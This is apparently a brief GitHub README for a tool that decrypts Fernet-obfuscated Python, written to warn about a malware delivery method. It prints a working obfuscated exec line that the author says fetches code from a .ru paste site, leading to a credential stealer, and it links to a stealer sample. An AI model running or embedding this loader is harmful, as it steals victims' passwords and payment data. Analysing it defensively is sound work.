## fernet decrypter
this code is simply to decode any type of fernet code that would usually run malware on your computer using python.
fernet is not only used to run malicious software keep that in mind. i am just giving an example 

## example of malicious code
`;exec(Fernet(b'q7MBuNUXpnt4GH9rHx3rNM1_HFsACuJIk1ZCLPBpU7I=').decrypt(b'gAAAAABk8g4eRFjyGDEmrLhaqqcXsILFNwp4eMaESVA1JWnfoVNhhSPBV_1ngtqebygT9MrIQ95jI1aR1fTfmknlOBY_bumaE8dAZ4WotYGKn0K-cRje6R3Ny4G75lRs8bgV5vv50fD0DtiWTKVsT4VP_FeUHA3so_StnOnG-rgPUWkIgiaX9UdRExOsX0eSqzHxP-88zENWuWdYNOflCmEDVdYOhuxYSg=='))`

if we break this code down it shows the normal python type of execution which is using a fernet key and an encrypted message to decoded a message using fernet library. when this code is ran through the decrypter it prints out a website `https://bananasquad.ru/paste`. when entering this site it shows again the same method of execution but now with a much longer encrypted message which when decoded shows a malicious python code that will steal every data on your computer such as passwords, credit card, discord credentials and so on. after downloading the stealer file ([stealer example](https://github.com/Nezar187/Fernet-Decrypter/blob/main/example%20stealer/stealer.py)) it reruns the fernet request with a new token and key.

at this point im to lazy to explain further on but in conclusion you should always look out for this type of method for execution.
